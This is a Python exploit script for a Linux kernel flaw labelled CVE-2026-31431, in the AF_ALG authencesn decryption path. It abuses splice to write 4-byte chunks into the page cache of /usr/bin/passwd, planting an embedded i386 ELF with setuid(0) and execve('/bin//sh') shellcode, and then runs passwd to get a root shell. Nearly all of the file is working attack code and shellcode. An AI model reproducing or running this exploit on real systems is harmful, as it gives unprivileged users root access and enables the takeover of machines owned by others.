#!/usr/bin/env python3
"""
CVE-2026-31431 — AF_ALG authencesn page-cache overwrite exploit

The authencesn AEAD implementation copies seqno_lo (bytes 4–7 of the AAD) back
into the scatter list via scatterwalk_map_and_copy during decryption. When the
ciphertext is supplied via splice, those scatter pages are borrowed from the
file's page cache — so seqno_lo lands in the page cache at an offset determined
by the splice length. This lets an unprivileged user overwrite arbitrary offsets
in any readable file's page cache.

Overwrites /usr/bin/passwd's page cache with a setuid(0)+execve shellcode ELF,
then executes passwd to drop into a root shell.
"""

import os
import socket

# ── AF_ALG constants ──────────────────────────────────────────────────────────

AF_ALG              = 38
SOL_ALG             = 279

ALG_SET_KEY         = 1
ALG_SET_AUTHSIZE    = 5
ALG_SET_OP          = 3
ALG_SET_IV          = 2
ALG_SET_AEAD_ASSOCLEN = 4

ALG_OP_DECRYPT      = 0
MSG_MORE            = 0x8000

# ── AEAD key material ─────────────────────────────────────────────────────────

# authencesn(hmac(sha256), cbc(aes)) key layout:
#   rtattr header (8 bytes): rta_len=8, rta_type=CRYPTO_AUTHENC_KEYA_PARAM, enckeylen=16
#   + 16-byte HMAC-SHA256 key (all zeros)
#   + 16-byte AES-128 key    (all zeros)
AEAD_KEY      = bytes.fromhex('0800010000000010') + b'\x00' * 32
AUTH_TAG_LEN  = 4    # minimum accepted tag size; value is never verified
IV_LEN        = 16
ASSOC_LEN     = 8    # seqno_hi (4 bytes) + seqno_lo (4 bytes)

# ── Core primitive ────────────────────────────────────────────────────────────

def write_4bytes(fd, target_offset, chunk):
    """
    Write the 4 bytes in `chunk` into the page cache of `fd` at `target_offset`.

    Mechanism:
      1. Open an authencesn AEAD socket and set chunk as seqno_lo in the AAD.
      2. Send the decrypt request with MSG_MORE (ciphertext arrives via splice).
      3. Splice (target_offset + 4) bytes from fd into the kernel scatter list.
         This maps the file's page-cache pages into the AEAD scatterwalk.
      4. Trigger the decrypt. authencesn writes seqno_lo back into the scatter
         list at a struct-size-dependent offset, corrupting the page cache.
    """
    alg_sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, AEAD_KEY)
    alg_sock.setsockopt(SOL_ALG, ALG_SET_AUTHSIZE, None, AUTH_TAG_LEN)
    op_sock, _ = alg_sock.accept()

    splice_len = target_offset + 4

    # AAD = seqno_hi (ignored) || seqno_lo (chunk — the bytes we want written)
    aad = b'\x00' * 4 + chunk
    ancdata = [
        (SOL_ALG, ALG_SET_OP,             ALG_OP_DECRYPT.to_bytes(4, 'little')),
        (SOL_ALG, ALG_SET_IV,             IV_LEN.to_bytes(4, 'little') + b'\x00' * IV_LEN),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN,  ASSOC_LEN.to_bytes(4, 'little')),
    ]
    op_sock.sendmsg([aad], ancdata, MSG_MORE)

    pipe_r, pipe_w = os.pipe()
    os.splice(fd, pipe_w, splice_len, offset_src=0)
    os.splice(pipe_r, op_sock.fileno(), splice_len)

    try:
        # Reading back triggers the decrypt and the seqno_lo write into the page cache.
        # EBADMSG is expected — the ciphertext and tag are garbage.
        op_sock.recv(ASSOC_LEN + target_offset)
    except OSError:
        pass

    os.close(pipe_r)
    os.close(pipe_w)
    op_sock.close()
    alg_sock.close()

# ── Payload ───────────────────────────────────────────────────────────────────

# Minimal i386 ELF: setuid(0) + execve("/bin//sh", ["/bin//sh", NULL], NULL)
# Entry point is 0x08048054, which is right after the ELF + program headers.
PAYLOAD_ELF = (
    # --- ELF header (52 bytes) ---
    b"\x7f\x45\x4c\x46\x01\x01\x01\x00"  # magic, 32-bit, LE, ELF version 1
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # OS/ABI = UNIX System V, padding
    b"\x02\x00\x03\x00\x01\x00\x00\x00"  # ET_EXEC, EM_386, e_version = 1
    b"\x54\x80\x04\x08"                   # e_entry      = 0x08048054
    b"\x34\x00\x00\x00"                   # e_phoff      = 0x34 (right after this header)
    b"\x00\x00\x00\x00"                   # e_shoff      = 0 (no section headers)
    b"\x00\x00\x00\x00"                   # e_flags      = 0
    b"\x34\x00\x20\x00"                   # e_ehsize=52, e_phentsize=32
    b"\x01\x00\x28\x00\x00\x00\x00\x00"  # e_phnum=1, e_shentsize/shnum/shstrndx=0
    # --- Program header (32 bytes) ---
    b"\x01\x00\x00\x00"                   # p_type   = PT_LOAD
    b"\x00\x00\x00\x00"                   # p_offset = 0 (load from start of file)
    b"\x00\x80\x04\x08"                   # p_vaddr  = 0x08048000
    b"\x00\x80\x04\x08"                   # p_paddr  = 0x08048000
    b"\x75\x00\x00\x00"                   # p_filesz = 117
    b"\x75\x00\x00\x00"                   # p_memsz  = 117
    b"\x05\x00\x00\x00"                   # p_flags  = PF_R|PF_X
    b"\x00\x10\x00\x00"                   # p_align  = 0x1000
    # --- Shellcode at 0x08048054 (entry point) ---
    b"\x31\xdb"                           # xor    ebx, ebx
    b"\x31\xc0"                           # xor    eax, eax
    b"\xb0\x17"                           # mov    al, 0x17    ; 23 = SYS_setuid
    b"\xcd\x80"                           # int    0x80        ; setuid(0)
    b"\x31\xc0"                           # xor    eax, eax
    b"\x50"                               # push   eax         ; NULL terminator for string
    b"\x68\x2f\x2f\x73\x68"              # push   "//sh"
    b"\x68\x2f\x62\x69\x6e"              # push   "/bin"      ; esp → "/bin//sh\0"
    b"\x89\xe3"                           # mov    ebx, esp    ; ebx = &"/bin//sh"
    b"\x50"                               # push   eax         ; argv[1] = NULL
    b"\x53"                               # push   ebx         ; argv[0] = &"/bin//sh"
    b"\x89\xe1"                           # mov    ecx, esp    ; ecx = argv
    b"\x31\xd2"                           # xor    edx, edx    ; envp = NULL
    b"\xb0\x0b"                           # mov    al, 0x0b    ; 11 = SYS_execve
    b"\xcd\x80"                           # int    0x80        ; execve("/bin//sh", argv, NULL)
    b"\x00\x00\x00"                       # pad to 4-byte boundary
)

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    passwd_fd = os.open('/usr/bin/passwd', os.O_RDONLY)

    offset = 0
    while offset < len(PAYLOAD_ELF):
        write_4bytes(passwd_fd, offset, PAYLOAD_ELF[offset:offset + 4])
        offset += 4

    os.close(passwd_fd)

    print('[*] page cache overwritten — executing passwd to spawn root shell')
    os.system('passwd')

main()
